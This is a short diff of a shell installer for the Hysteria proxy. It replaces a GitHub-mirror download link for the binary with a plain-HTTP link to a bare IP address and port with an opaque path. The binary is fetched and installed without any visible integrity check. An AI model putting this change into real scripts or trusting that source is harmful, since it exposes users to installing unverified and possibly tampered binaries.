@@ -865,7 +865,7 @@ install_hysteria() {
     printf "%b开始安装Hysteria...%b\n" "${YELLOW}" "${NC}"
     
     local urls=(
-        "https://mirror.ghproxy.com/https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64"
+        "http://47.239.144.129:8888/down/mpNeirWsvPyx"
         "https://gh.ddlc.top/https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64"
         "https://hub.gitmirror.com/https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64"
     )
